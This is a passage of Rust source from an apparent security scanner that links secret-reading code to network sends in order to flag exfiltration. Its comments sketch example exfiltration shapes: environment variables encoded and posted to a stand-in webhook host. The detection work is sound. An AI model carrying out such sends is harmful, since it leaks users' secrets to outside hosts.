            | "kts" | "c" | "h" | "cc" | "cpp" | "hpp" | "cs" | "swift" | "scala" | "dart" => {
                Lang::CLike
            }
            "php" => Lang::Php,
            "md" | "mdx" | "markdown" | "txt" | "rst" => Lang::Prose,
            _ => Lang::Other,
        }
    }
}

/// `text` with what is not code blanked: comments, and the contents of
/// string literals except what a string interpolates — a Python f-string's
/// `{expr}` (without its `=`, `!conversion` or `:spec`), `${...}`, `$(...)`
/// and `$NAME`, and, when the text formats with `locals()`, `vars()` or
/// `globals()`, a plain string's `{name}` and `%(name)s` placeholders.
///
/// The result has the same length as `text`, byte for byte, so an offset in
/// one is the same place in the other. Quote characters are kept. A quote
/// does not carry over to the next line, except in a triple-quoted string
/// or a JavaScript template.
fn code_only(text: &str, lang: Lang) -> String {
    blank(text, lang, true)
}

/// `text` with its comments blanked and its strings kept: what a rule that
/// matched the line would still match if the line had no comment. Same
/// length as `text`, byte for byte.
fn without_comments(text: &str, lang: Lang) -> String {
    blank(text, lang, false)
}

/// Blank the comments of `text`, and, with `strings`, the contents of its
/// string literals (see [`code_only`]).
fn blank(text: &str, lang: Lang, strings: bool) -> String {
    if lang == Lang::Other {
        return text.to_string();
    }
    let b = text.as_bytes();
    let placeholders = ["locals()", "vars()", "globals()"]
        .iter()
        .any(|f| text.contains(f));
    let mut out: Vec<u8> = Vec::with_capacity(b.len());
    let mut i = 0;
    while i < b.len() {
        if let Some(end) = comment_end(b, i, lang) {
            out.extend(
                b[i..end]
                    .iter()
                    .map(|&c| if c == b'\n' { b'\n' } else { b' ' }),
            );
            i = end;
            continue;
        }
        if let Some(open) = string_open(b, i, lang) {
            out.extend_from_slice(&b[i..open.body]);
            let body = out.len();
            // `mask_string` writes one byte for each byte it reads.
            let end = mask_string(b, &open, placeholders, &mut out);
            if !strings {
                out.truncate(body);
                out.extend_from_slice(&b[open.body..end]);
            }
            i = end;
            continue;
        }
        if let Some(end) = regex_literal_end(b, i, lang) {
            // The slashes stay; the pattern is text, like a string's.
            out.push(b'/');
            if strings {
                out.extend(std::iter::repeat_n(b' ', end - i - 2));
            } else {
                out.extend_from_slice(&b[i + 1..end - 1]);
            }
            out.push(b'/');
            i = end;
            continue;
        }
        out.push(b[i]);
        i += 1;
    }
    String::from_utf8(out).unwrap_or_else(|e| String::from_utf8_lossy(e.as_bytes()).into_owned())
}

/// Where the JavaScript regular-expression literal starting at `i` ends
/// (after its closing `/`), if one starts there: a `/` where a value is
/// expected (at the start of a line, or after `(`, `,`, `=`, `:`, `[`, `!`,
/// `&`, `|`, `?`, `{`, `}`, `;` or an arithmetic operator), closed on the same
/// line by a `/` outside a `[...]` class and not escaped. After a name, a
/// number or `)` a `/` divides. Without this, a quote inside a pattern
/// (`/"/g`) would open a string running to the end of the line.
fn regex_literal_end(b: &[u8], i: usize, lang: Lang) -> Option<usize> {
    const MAX_REGEX: usize = 256;
    if lang != Lang::CLike || b[i] != b'/' || matches!(b.get(i + 1), Some(b'/' | b'*')) {
        return None;
    }
    let mut k = i;
    while k > 0 && (b[k - 1] == b' ' || b[k - 1] == b'\t') {
        k -= 1;
    }
    if k > 0 && !b"\n(,=:[!&|?{};+-*%<>~^".contains(&b[k - 1]) {
        return None;
    }
    let mut j = i + 1;
    let mut class = false;
    // A longer pattern is left alone: stopping here keeps a line of `/`s
    // that never close (`(/[(/[...`) linear.
    while j < b.len() && b[j] != b'\n' && j - i <= MAX_REGEX {
        match b[j] {
            b'\\' if b.get(j + 1) == Some(&b'\n') => return None,
            b'\\' => j += 1,
            b'[' => class = true,
            b']' => class = false,
            b'/' if !class => return (j > i + 1).then_some(j + 1),
            _ => {}
        }
        j += 1;
    }
    None
}

/// Where the comment starting at `i` ends, if one starts there.
fn comment_end(b: &[u8], i: usize, lang: Lang) -> Option<usize> {
    let after_blank = i == 0 || b[i - 1].is_ascii_whitespace();
    let eol = || {
        b[i..]
            .iter()
            .position(|&c| c == b'\n')
            .map_or(b.len(), |p| i + p)
    };
    let hash = match lang {
        Lang::Python => true,
        Lang::Hash | Lang::Php | Lang::Prose => after_blank,
        Lang::CLike | Lang::Other => false,
    };
    if b[i] == b'#' && hash {
        return Some(eol());
    }
    if matches!(lang, Lang::CLike | Lang::Php | Lang::Prose)
        && b[i..].starts_with(b"//")
        && (after_blank || (lang != Lang::Prose && b";){},".contains(&b[i - 1])))
    {
        return Some(eol());
    }
    if matches!(lang, Lang::CLike | Lang::Php) && b[i..].starts_with(b"/*") {
        let close = b[i + 2..].windows(2).position(|w| w == b"*/");
        return Some(close.map_or(b.len(), |p| i + 2 + p + 2));
    }
    None
}

/// A string literal's opening, as [`string_open`] found it.
struct StringOpen {
    quote: u8,
    triple: bool,
    /// A Python f-string: `{expr}` is interpolated.
    fstring: bool,
    /// The offset of the first byte of the string's contents.
    body: usize,
}

/// Does a string literal open at `i`? A quote directly after a word opens
/// one only when the word is a Python string prefix (`f"`, `rb'`); otherwise
/// it is an apostrophe (`don't`). A backtick opens one only in the C family
/// (in shell and Markdown it is code).
fn string_open(b: &[u8], i: usize, lang: Lang) -> Option<StringOpen> {
    let q = b[i];
    let backtick = q == b'`' && lang == Lang::CLike;
    if !(q == b'"' || q == b'\'' || backtick) {
        return None;
    }
    let mut k = i;
    while k > 0 && b[k - 1].is_ascii_alphabetic() {
        k -= 1;
    }
    let prefix = &b[k..i];
    let mut fstring = false;
    if !backtick && i > 0 && is_ident_byte(b[i - 1]) {
        let python = matches!(lang, Lang::Python | Lang::Prose);
        let is_prefix = python
            && !prefix.is_empty()
            && prefix.len() <= 2
            && (k == 0 || !is_ident_byte(b[k - 1]))
            && prefix.iter().all(|c| b"rRbBuUfF".contains(c));
        if !is_prefix {
            return None;
        }
        fstring = prefix.iter().any(|c| *c == b'f' || *c == b'F');
    }
    let triple = matches!(lang, Lang::Python | Lang::Prose)
        && b.get(i + 1) == Some(&q)
        && b.get(i + 2) == Some(&q);
    Some(StringOpen {
        quote: q,
        triple,
        fstring,
        body: i + if triple { 3 } else { 1 },
    })
}

/// Blank the contents of the string `open` starts, keeping what it
/// interpolates, and return the offset just after it (or of the line end
/// that stopped it).
fn mask_string(b: &[u8], open: &StringOpen, placeholders: bool, out: &mut Vec<u8>) -> usize {
    let q = open.quote;
    let n = if open.triple { 3 } else { 1 };
    let multiline = open.triple || q == b'`';
    let mut i = open.body;
    while i < b.len() {
        let c = b[i];
        if c == b'\\' {
            out.push(b' ');
            i += 1;
            if b.get(i).is_some_and(|&x| x != b'\n') {
                out.push(b' ');
                i += 1;
            }
            continue;
        }
        if c == q && b[i..].iter().take(n).filter(|&&x| x == q).count() == n {
            out.extend(std::iter::repeat_n(q, n));
            return i + n;
        }
        if c == b'\n' {
            if !multiline {
                return i;
            }
            out.push(b'\n');
            i += 1;
            continue;
        }
        if c == b'$' {
            match b.get(i + 1) {
                Some(b'{' | b'(') => {
                    i = copy_group(b, i, out);
                    continue;
                }
                Some(&x) if x.is_ascii_alphabetic() || x == b'_' => {
                    // `$NAME`, and PowerShell's `$env:NAME`.
                    out.push(b'$');
                    i += 1;
                    while i < b.len()
                        && (is_ident_byte(b[i])
                            || (b[i] == b':'
                                && b.get(i + 1).is_some_and(|&y| y.is_ascii_alphabetic())))
                    {
                        out.push(b[i]);
                        i += 1;
                    }
                    continue;
                }
                _ => {}
            }
        }
        if c == b'{' && (open.fstring || placeholders) {
            if b.get(i + 1) == Some(&b'{') {
                out.extend_from_slice(b"  ");
                i += 2;
                continue;
            }
            if open.fstring
                || b.get(i + 1)
                    .is_some_and(|&x| x.is_ascii_alphabetic() || x == b'_')
            {
                i = copy_field(b, i, out);
                continue;
            }
        }
        if c == b'%' && placeholders && b.get(i + 1) == Some(&b'(') {
            out.extend_from_slice(b"  ");
            i += 2;
            while i < b.len() && is_ident_byte(b[i]) {
                out.push(b[i]);
                i += 1;
            }
            continue;
        }
        out.push(b' ');
        i += 1;
    }
    i
}

/// Copy the `${...}` or `$(...)` group whose `$` is at `i`, as it is, and
/// return the offset after its closing bracket (or of the line end).
fn copy_group(b: &[u8], i: usize, out: &mut Vec<u8>) -> usize {
    out.push(b'$');
    let mut depth = 0usize;
    let mut j = i + 1;
    while j < b.len() && b[j] != b'\n' {
        out.push(b[j]);
        match b[j] {
            b'{' | b'(' => depth += 1,
            b'}' | b')' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return j + 1;
                }
            }
            _ => {}
        }
        j += 1;
    }
    j
}

/// Copy the expression of the replacement field whose `{` is at `i`
/// (`{token}`, `{token=}`, `{token!r:>40}`, `{d["k"]:{w}}`): the braces
/// become blanks, the expression is kept, and what follows a top-level `=`
/// (Python's self-documenting field), `!` (a conversion) or `:` (a format
/// spec) is blanked, as are the contents of strings inside the expression.
/// Returns the offset after the closing `}` (or of the line end).
fn copy_field(b: &[u8], i: usize, out: &mut Vec<u8>) -> usize {
    out.push(b' ');
    let mut j = i + 1;
    let mut depth = 0usize;
    let mut spec = false;
    let mut inner: Option<u8> = None;
    while j < b.len() && b[j] != b'\n' {
        let c = b[j];
        if let Some(iq) = inner {
            out.push(if c == iq { c } else { b' ' });
            if c == iq {
                inner = None;
            }
            j += 1;
            continue;
        }
        let next = b.get(j + 1).copied();
        let prev = if j > i + 1 { b[j - 1] } else { b'{' };
        if spec {
            match c {
                b'{' => depth += 1,
                b'}' if depth == 0 => {
                    out.push(b' ');
                    return j + 1;
                }
                b'}' => depth -= 1,
                _ => {}
            }
            out.push(b' ');
            j += 1;
            continue;
        }
        match c {
            b'(' | b'[' | b'{' => {
                depth += 1;
                out.push(c);
            }
            b')' | b']' => {
                depth = depth.saturating_sub(1);
                out.push(c);
            }
            b'}' if depth == 0 => {
                out.push(b' ');
                return j + 1;
            }
            b'}' => {
                depth -= 1;
                out.push(c);
            }
            b'"' | b'\'' => {
                inner = Some(c);
                out.push(c);
            }
            b'=' if depth == 0 && next != Some(b'=') && !b"=!<>".contains(&prev) => {
                spec = true;
                out.push(b' ');
            }
            b'!' | b':' if depth == 0 && next != Some(b'=') => {
                spec = true;
                out.push(b' ');
            }
            _ => out.push(c),
        }
        j += 1;
    }
    j
}

/// Run the active corpus's correlation rules over one file's findings, as
/// the scanner does: with the corpus's own patterns to tell a finding that
/// matched only a line's comment (see [`apply_matching`]).
pub fn apply_corpus(findings: &[Finding], lines: &[&str]) -> Vec<Finding> {
    let corpus = crate::corpus::compiled::corpus();
    apply_matching(&corpus.correlation_rules, findings, lines, &|id, text| {
        corpus.rule_matches(id, text)
    })
}

/// Run every correlation rule over one file's findings.
///
/// `lines` are the file's lines (already normalised for matching), used to
/// read the source assignment and the sink argument window. Returns only the
/// new chain findings; the caller appends them.
#[cfg_attr(not(test), allow(dead_code))]
pub fn apply(rules: &[CorrelationRule], findings: &[Finding], lines: &[&str]) -> Vec<Finding> {
    apply_matching(rules, findings, lines, &|_, _| None)
}

/// [`apply`], with `matches(rule_id, text)` saying whether a content rule's
/// pattern matches a text (`None`: no pattern to ask). A rule that reads
/// names as values links a source and a sink on one line (or one call) only
/// when neither matched only the line's comment: `curl https://status.example
/// # MCP_TOKEN stays local` is a request with a note beside it.
pub fn apply_matching(
    rules: &[CorrelationRule],
    findings: &[Finding],
    lines: &[&str],
    matches: &dyn Fn(&str, &str) -> Option<bool>,
) -> Vec<Finding> {
    let mut out: Vec<Finding> = Vec::new();
    if rules.is_empty() || findings.len() < 2 {
        return out;
    }
    // The findings are one file's: its extension says what the value reading
    // counts as code.
    let code = CodeLines::new(lines, Lang::of(&findings[0].file));
    // Did this finding match only its line's comment?
    let in_a_comment = |f: &Finding| -> bool {
        let Some(line) = lines.get(f.line.unwrap_or(0).wrapping_sub(1)).copied() else {
            return false;
        };
        matches(&f.rule, line) == Some(true)
            && matches(&f.rule, &without_comments(line, code.lang)) == Some(false)
    };

    for rule in rules {
        let Some(phase) = Phase::from_name(&rule.phase) else {
            continue;
        };
        let severity = parse_severity(&rule.severity);
        let weight = rule.weight.unwrap_or_else(|| phase.default_weight());

        let sources: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.source.accepts(&f.rule))
            .collect();
        if sources.is_empty() {
            continue;
        }
        let sinks: Vec<&Finding> = findings
            .iter()
            .filter(|f| f.line.is_some() && rule.sink.accepts(&f.rule))
            .collect();

        let mut emitted: Vec<(usize, usize)> = Vec::new();
        for sink in &sinks {
            let sink_line = sink.line.unwrap_or(0);
            if too_long(lines, sink_line, rule.max_line_length) {
                continue;
            }
            let file_only = runs_a_file(&sink.rule);
            // A rule that looks above the sink reads the sink's statement and
            // the lines that set up or use the object it binds; every other
            // rule reads the sink line and the lines after it.
            let statement_mode = !file_only && rule.sink_window_before > 0;
            let by_value = links_by_value(rule, statement_mode);
            // A source map carries other files' source as JSON string data;
            // one line of it holds unrelated code megabytes apart, and none
            // of it runs.
            if by_value && sink.file.ends_with(".map") {
                continue;
            }
            let scope = if statement_mode {
                statement_scope(lines, sink_line, rule.sink_window_before)
            } else {
                SinkScope::line(sink_line, arg_window(lines, sink_line))
            };
            let window = scope.text.as_str();
            // A launch names its program on its own line (the launch rule
            // matches interpreter and operand together), so the lines after
            // it are not its program: `>/dev/null` or `input=data` there is
            // not what runs.
            let launch_line = lines.get(sink_line.wrapping_sub(1)).copied().unwrap_or("");
            if rule
                .sink_excludes
                .iter()
                .any(|x| window.contains(x.as_str()))
            {
                continue;
            }
            // What the value reading reads, as written and as code: the
            // statement mode's window, or else the sink's call (see
            // [`call_scope`]). Made when a source first needs it.
            let value_cell: OnceCell<(String, String, usize)> = OnceCell::new();
            let value_text = || {
                value_cell.get_or_init(|| {
                    let (raw, last) = if statement_mode {
                        (window.to_string(), scope.end)
                    } else {
                        call_scope(&code, sink_line, names_a_destination(&sink.rule))
                    };
                    let masked = code_only(&raw, code.lang);
                    (raw, masked, last)
                })
            };
            // The word reading's window as code, for following a derived
            // name (see [`derived_names`]).
            let window_cell: OnceCell<String> = OnceCell::new();
            let window_code = || window_cell.get_or_init(|| code_only(window, code.lang));
            let launched_cell: OnceCell<Vec<&str>> = OnceCell::new();
            let launched = || launched_cell.get_or_init(|| launched_operands(launch_line));
            for source in &sources {
                let source_line = source.line.unwrap_or(0);
                // A source on another line of the sink's own statement (the
                // call or literal it is an argument of, above or below it)
                // is in that call: what it reads is one of the arguments,
                // whatever name it is, or is not, bound to.
                let in_same_call = scope.same_call(source_line, sink_line);
                if !in_same_call
                    && (source_line > sink_line || sink_line - source_line > rule.window_lines)
                {
                    continue;
                }
                if too_long(lines, source_line, rule.max_line_length) {
                    continue;
                }
                // Any other source is linked through a name it binds that
                // the window uses.
                let linked = if source_line == sink_line || in_same_call {
                    // Read by value, the line (or call) is the link only if
                    // what matched there is code, not a note beside it.
                    !by_value
                        || !(in_a_comment(source)
                            || (source_line == sink_line && in_a_comment(sink)))
                } else if let Some(l) = lines.get(source_line.wrapping_sub(1)).copied() {
                    if file_only {
                        let written = written_paths(l);
                        if by_value {
                            // Only through the program the launch runs; a
                            // launch whose program operand is not one of the
                            // shapes [`launched_operands`] reads is read by
                            // value on its whole line.
                            let ops = launched();
                            written.iter().any(|p| {
                                if !ops.is_empty() {
                                    ops.iter().any(|op| contains_word(op, p))
                                } else if is_identifier(p) {
                                    uses_value(code.code(sink_line), p, code.lang, None)
                                } else {
                                    contains_word(launch_line, p)
                                }
                            })
                        } else {
                            written.iter().any(|p| contains_word(launch_line, p))
                        }
                    } else {
                        let bound = source_bindings(l);
                        if by_value {
                            let assigned = assignment(l);
                            let (raw, masked, last) = value_text();
                            // Where a parameter of the same name, of a
                            // function the sink is in, takes over from the
                            // bound value (see [`shadowed_from`]; the window
                            // starts at the sink line outside the statement
                            // mode).
                            let limit = |name: &str, len: usize| {
                                if statement_mode {
                                    len
                                } else {
                                    shadowed_from(
                                        &code,
                                        source_line,
                                        sink_line,
                                        name,
                                        rule.window_lines,
                                    )
                                    .map_or(len, |at| at.min(len))
                                }
                            };
                            // A call's keyword names and keys are not values
                            // it sends (`name_uses`).
                            let reads = |name: &str| {
                                if is_identifier(name) {
                                    let recv = assigned
                                        .as_ref()
                                        .filter(|a| a.name == name)
                                        .and_then(|a| a.recv);
                                    uses_value_before(
                                        masked,
                                        name,
                                        code.lang,
                                        recv,
                                        limit(name, masked.len()),
                                    )
                                } else {
                                    contains_word(raw, name)
                                }
                            };
                            bound.iter().any(|b| reads(b))
                                // Outside the statement mode, a name assigned
                                // from the bound one before the send, where
                                // the word reading's window names the bound
                                // one in its code (and not as the parameter
                                // of a function the sink is in).
                                || (!statement_mode
                                    && bound.iter().any(|b| {
                                        let w = window_code();
                                        is_identifier(b) && contains_word(prefix(w, limit(b, w.len())), b)
                                    })
                                    && derived_names(&code, source_line, *last, &bound)
                                        .iter()
                                        .any(|d| {
                                            uses_value_before(masked, d, code.lang, None, limit(d, masked.len()))
                                        }))
                        } else {
                            bound.iter().any(|b| contains_word(window, b))
                        }
                    }
                } else {
                    false
                };
                if !linked {
                    continue;
                }
                let key = (source_line, sink_line);
                if emitted.contains(&key) {
                    continue;
                }
                emitted.push(key);
                out.push(Finding {
                    phase,
                    rule: rule.id.clone(),
                    severity,
                    file: sink.file.clone(),
                    line: Some(sink_line),
                    snippet: format!(
                        "{}: {} (@L{}) reaches {} (@L{}): {}",
                        rule.description,
                        source.rule,
                        source_line,
                        sink.rule,
                        sink_line,
                        truncate(
                            lines
                                .get(sink_line.wrapping_sub(1))
                                .map_or("", |l| l.trim())
                        )
                    ),
                    weight,
                    kev: false,
                    epss: 0.0,
                    fingerprint: String::new(),
                    locator: sink.locator.clone(),
                    evidence: Default::default(),
                });
            }
        }
    }
    out
}

/// Does `rule` link a bound name only where the window uses it as a value
/// ([`uses_word`]) rather than on any whole-word occurrence
/// ([`contains_word`])? The rule's `name_uses` decides; unset, the rule links
/// the way it did before the field existed: by value in the statement mode,
/// by word otherwise.
fn links_by_value(rule: &CorrelationRule, statement_mode: bool) -> bool {
    match rule.name_uses {
        Some(NameUses::Value) => true,
        Some(NameUses::Word) => false,
        None => statement_mode,
    }
}

/// The sink line plus the lines that can still carry its arguments: the
/// [`SINK_ARG_WINDOW`] lines from the sink (1-based) down.
fn arg_window(lines: &[&str], sink_line: usize) -> String {
    if sink_line == 0 {
        return String::new();
    }
    let start = sink_line - 1;
    let end = lines.len().min(start + SINK_ARG_WINDOW);
    lines
        .get(start..end)
        .map(|w| w.join("\n"))
        .unwrap_or_default()
}

/// A file's lines, and each line with what is not code blanked
/// ([`code_only`]), made once, when the value reading first asks for it.
struct CodeLines<'a> {
    lines: &'a [&'a str],
    lang: Lang,
    code: Vec<OnceCell<String>>,
}

impl<'a> CodeLines<'a> {
    fn new(lines: &'a [&'a str], lang: Lang) -> Self {
        CodeLines {
            lines,
            lang,
            code: lines.iter().map(|_| OnceCell::new()).collect(),
        }
    }

    /// 1-based line `n` as code; empty outside the file.
    fn code(&self, n: usize) -> &str {
        match (
            self.lines.get(n.wrapping_sub(1)),
            self.code.get(n.wrapping_sub(1)),
        ) {
            (Some(line), Some(cell)) => cell.get_or_init(|| code_only(line, self.lang)),
            _ => "",
        }
    }
}

/// Does the sink rule match a line that names where data will go, or opens
/// the connection it will go through, without sending anything itself: a
/// webhook, callback or tunnel URL (NET-006, NET-007, NET-014, AGENTSC-020),
/// an HTTP client connection (NET-003), a socket (NET-008, NET-009)? The send
/// is a later line that uses the name such a line assigns (`url = "https://
/// hook.example/c"`, then `Request(url, data=body)`). Every other sink sends
/// on its own statement, and what the lines after it do with its result
/// happens after the send.
fn names_a_destination(rule_id: &str) -> bool {
    rule_id == "NET-003"
        || matches!(
            super::profile::behavior_for(rule_id),
            Some("exfiltration_endpoint" | "raw_sockets" | "c2_tunnel_host")
        )
}

/// The window the value reading reads for a sink outside the statement mode,
/// and its last line: the sink line, the lines its call continues onto
/// (while a bracket it opened is still open, or the line ends inside an
/// argument list — see [`continues_into_next`]), and, for a sink that
/// [`names_a_destination`], the lines below that use the name the sink line
/// assigns; all within the [`SINK_ARG_WINDOW`] lines [`arg_window`] reads. A
/// complete statement after the sink is something else: a docstring, a log
/// line, the next function's `def connect(url):`.
fn call_scope(code: &CodeLines, sink_line: usize, follow_uses: bool) -> (String, usize) {
    let lines = code.lines;
    if sink_line == 0 || sink_line > lines.len() {
        return (String::new(), sink_line);
    }
    let depth = |n: usize| -> isize {
        code.code(n)
            .bytes()
            .map(|b| match b {
                b'(' | b'[' | b'{' => 1,
                b')' | b']' | b'}' => -1,
                _ => 0,
            })
            .sum()
    };
    let last = lines.len().min(sink_line + SINK_ARG_WINDOW - 1);
    let mut end = sink_line;
    let mut open = depth(sink_line);
    while end < last && (open > 0 || continues_into_next(lines[end - 1])) {
        end += 1;
        open += depth(end);
    }
    let mut keep: Vec<usize> = (sink_line..=end).collect();
    if let Some((bound, _)) = assigned_name(lines[sink_line - 1]).filter(|_| follow_uses) {
        keep.extend((end + 1..=last).filter(|&n| uses_word(lines[n - 1], bound)));
    }
    let last_kept = keep.last().copied().unwrap_or(sink_line);
    let text = keep
        .into_iter()
        .map(|n| lines[n - 1])
        .collect::<Vec<_>>()
        .join("\n");
    (text, last_kept)
}

/// A line longer than this is not read as a hop by [`derived_names`]: a hop
/// is one assignment, and a longer line is minified code, where one line
/// holds a whole program.
const MAX_HOP_LINE: usize = 1_000;

/// Names assigned, on the lines after `source_line` and before `send_line`
/// (the last line of the sink's [`call_scope`]), from an expression that
/// uses a `bound` name — or a name derived before it — as a value: `encoded
/// = urlencode(data)` after `data = dict(os.environ)`, `b64env =
/// b64encode(benv)` after `benv = env.encode()`.
///
/// The value reading follows these only where the word reading's window
/// names a bound name in its code (see [`apply`]): an exfiltration that
/// encodes the secret into a new name before a send whose window also names
/// the secret (`Request(url, data=encoded_data)` beside a bound `data`)
/// keeps the link the word reading made, and no link is made that the word
/// reading did not make. Following derived names everywhere would be the
/// taint propagation ADR-0005 keeps out of the engine, and would link
/// ordinary clients (`auth = (user, password)`, then `get(url, auth=auth)`)
/// that neither reading links.
fn derived_names<'a>(
    code: &CodeLines<'a>,
    source_line: usize,
    send_line: usize,
    bound: &[&str],
) -> Vec<&'a str> {
    let lines = code.lines;
    let mut names: Vec<&str> = bound.iter().copied().filter(|b| is_identifier(b)).collect();
    let mut derived: Vec<&'a str> = Vec::new();
    for n in source_line + 1..send_line.min(lines.len() + 1) {
        let line: &'a str = lines[n - 1];
        if line.len() > MAX_HOP_LINE {
            continue;
        }
        let Some(a) = assignment(line) else {
            continue;
        };
        if names.contains(&a.name) {
            continue;
        }
        // `code_only` keeps offsets, so the right-hand side starts at the
        // same offset in the line as code.
        let rhs = code.code(n).get(line.len() - a.rhs.len()..).unwrap_or("");
        if names.iter().any(|x| uses_value(rhs, x, code.lang, None)) {
            names.push(a.name);
            derived.push(a.name);
        }
    }
    derived
}

/// A function header that declares parameters, in Python or the C family:
/// `def ping(url):`, `lambda url:`, `function f(token) {`, `(token: string)
/// =>`, `token =>`, `call(path: string, token?: string) {`. `name` is the
/// function's name where the header gives one (`ping = lambda url: ...`,
/// `const f = (token) => ...`); `params` its parameter list; `body` the
/// offset where its parameters end and its body starts.
struct Header<'a> {
    name: Option<&'a str>,
    params: &'a str,
    start: usize,
    body: usize,
    /// Python's `def`, whose body is the lines indented under it; otherwise
    /// a brace-delimited body, or an expression on the header's line.
    indented: bool,
}

fn py_header_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(concat!(
            r"^(?P<def>\s*(?:async\s+)?def\s+(?P<dname>[A-Za-z_]\w*)\s*\()(?P<dparams>[^)\n]*)\)[^:\n]*:",
            r"|(?:\b(?P<lname>[A-Za-z_]\w*)\s*=\s*)?\blambda\b(?P<lparams>[^:\n]*):",
        ))
        .expect("python header regex compiles")
    })
}

fn js_header_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(concat!(
            r"\bfunction\b\s*\*?\s*(?P<fname>[A-Za-z_$][\w$]*)?\s*\((?P<fparams>[^)\n]*)\)",
            r"|(?:\b(?P<aname>[A-Za-z_$][\w$]*)\s*=\s*)?(?:\basync\s*)?\((?P<aparams>[^()\n]*)\)\s*(?::\s*[^=;{}()\n]*)?=>",
            r"|(?:\b(?P<sname>[A-Za-z_$][\w$]*)\s*=\s*)?(?:\basync\s+)?\b(?P<sparam>[A-Za-z_$][\w$]*)\s*=>",
            r"|^\s*(?:(?:public|private|protected|static|async|override|readonly|get|set)\s+)*(?P<mname>[A-Za-z_$][\w$]*)\s*\((?P<mparams>[^)\n]*)\)\s*(?::\s*[^{;=\n]*)?\{",
        ))
        .expect("js header regex compiles")
    })
}

/// The function headers on one line of code (strings and comments blanked).
fn headers(code: &str, lang: Lang) -> Vec<Header<'_>> {
    let mut out = Vec::new();
    match lang {
        Lang::Python => {
            for c in py_header_re().captures_iter(code) {
                let whole = c.get(0).map_or(0..0, |m| m.range());
                let (name, params, indented) = match (c.name("dparams"), c.name("lparams")) {
                    (Some(p), _) => (c.name("dname"), p, true),
                    (None, Some(p)) => (c.name("lname"), p, false),
                    _ => continue,
                };
                out.push(Header {
                    name: name.map(|m| m.as_str()),
                    params: params.as_str(),
                    start: params.start(),
                    body: whole.end,
                    indented,
                });
            }
        }
        Lang::CLike => {
            for c in js_header_re().captures_iter(code) {
                let whole = c.get(0).map_or(0..0, |m| m.range());
                let (name, params) = if let Some(p) = c.name("fparams") {
                    (c.name("fname"), p)
                } else if let Some(p) = c.name("aparams") {
                    (c.name("aname"), p)
                } else if let Some(p) = c.name("sparam") {
                    (c.name("sname"), p)
                } else if let Some(p) = c.name("mparams") {
                    let name = c.name("mname");
                    // Control flow, not a method: `if (token) {`.
                    if name.is_some_and(|n| {
                        matches!(
                            n.as_str(),
                            "if" | "for"
                                | "while"
                                | "switch"
                                | "catch"
                                | "with"
                                | "return"
                                | "function"
                        )
                    }) {
                        continue;
                    }
                    (name, p)
                } else {
                    continue;
                };
                // A method's match ends with the `{` that opens its body;
                // the body starts at that brace.
                let body = if c.name("mparams").is_some() {
                    whole.end - 1
                } else {
                    whole.end
                };
                out.push(Header {
                    name: name.map(|m| m.as_str()),
                    params: params.as_str(),
                    start: params.start(),
                    body,
                    indented: false,
                });
            }
        }
        _ => {}
    }
    out
}

/// Does a parameter list declare `name` as a parameter, whose value is then
/// whatever the caller passes? A default that is the bound value itself
/// (`def ping(url=url):`) does not shadow it.
fn declares(params: &str, name: &str) -> bool {
    let b = params.as_bytes();
    let mut pieces = Vec::new();
    let (mut depth, mut from) = (0usize, 0usize);
    for (i, &c) in b.iter().enumerate() {
        match c {
            b'(' | b'[' | b'{' | b'<' => depth += 1,
            b')' | b']' | b'}' | b'>' => depth = depth.saturating_sub(1),
            b',' if depth == 0 => {
                pieces.push(&params[from..i]);
                from = i + 1;
            }
            _ => {}
        }
    }
    pieces.push(&params[from..]);
    pieces.into_iter().any(|piece| {
        let p = piece.trim_start().trim_start_matches(['*', '.', ' ']);
        let p = ["public ", "private ", "protected ", "readonly "]
            .iter()
            .fold(p, |p, m| p.strip_prefix(m).unwrap_or(p).trim_start());
        // The default, after the first `=` that is not `==` or `=>`.
        let (head, default) = match p.find('=') {
            Some(i) if !p[i + 1..].starts_with(['=', '>']) => (&p[..i], &p[i + 1..]),
            _ => (p, ""),
        };
        let declared = if head.starts_with(['{', '[']) {
            // A destructuring pattern declares the names that are not keys:
            // `{ token }`, `{ token = x }`, `{ key: token }`.
            occurrences(head, name).any(|at| !head[at + name.len()..].trim_start().starts_with(':'))
        } else {
            let end = p.find(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '$'));
            &p[..end.unwrap_or(p.len())] == name
        };
        declared && !contains_word(default, name)
    })
}

/// `s` up to byte `n`, or up to the char boundary before it.
fn prefix(s: &str, n: usize) -> &str {
    let mut n = n.min(s.len());
    while !s.is_char_boundary(n) {
        n -= 1;
    }
    &s[..n]
}

/// Is `line` inside the body of the function whose header is on `h`?
/// Python's `def` body is the lines indented deeper than the header until
/// one that is not; a C-family body is the braces that open after the
/// header, or, for an arrow without braces, the header's line and a line it
/// continues onto.
fn in_body(code: &CodeLines, h: usize, header: &Header, line: usize) -> bool {
    let indent = |n: usize| {
        let c = code.code(n);
        (c.len() - c.trim_start().len(), c.trim().is_empty())
    };
    if header.indented {
        let (base, _) = indent(h);
        // A body on the header's own line (`def f(url): return url`) ends
        // there.
        if !code
            .code(h)
            .get(header.body..)
            .unwrap_or("")
            .trim()
            .is_empty()
        {
            return false;
        }
        return (h + 1..=line).all(|n| {
            let (i, blank) = indent(n);
            blank || i > base
        });
    }
    if code.lang == Lang::Python {
        // A lambda's body is its expression, on its line.
        return false;
    }
    let mut depth = 0isize;
    let mut opened = false;
    for n in h..line {
        let c = code.code(n);
        let from = if n == h { header.body.min(c.len()) } else { 0 };
        for b in c[from..].bytes() {
            match b {
                b'{' => {
                    depth += 1;
                    opened = true;
                }
                b'}' => {
                    depth -= 1;
                    if opened && depth <= 0 {
                        return false;
                    }
                }
                _ => {}
            }
        }
        if !opened && n == h {
            // An arrow with an expression body continues onto the next line
            // only when its line ends there (`=>`) or inside the expression.
            let rest = c[from..].trim_end();
            if !(rest.is_empty() || continues_into_next(c)) {
                return false;
            }
        }
    }
    opened && depth > 0 || (!opened && line == h + 1)
}

/// Is the function called `name` called with `bound`, or a name assigned
/// from it since `source_line` (`t = token`, then `send(t)`), as a value on
/// one of `lines`, other than `skip` (its header)? Then its parameter
/// receives the bound value, and a use of the parameter is a use of that
/// value.
fn called_with(
    code: &CodeLines,
    name: &str,
    bound: &str,
    source_line: usize,
    lines: std::ops::RangeInclusive<usize>,
    skip: usize,
) -> bool {
    lines
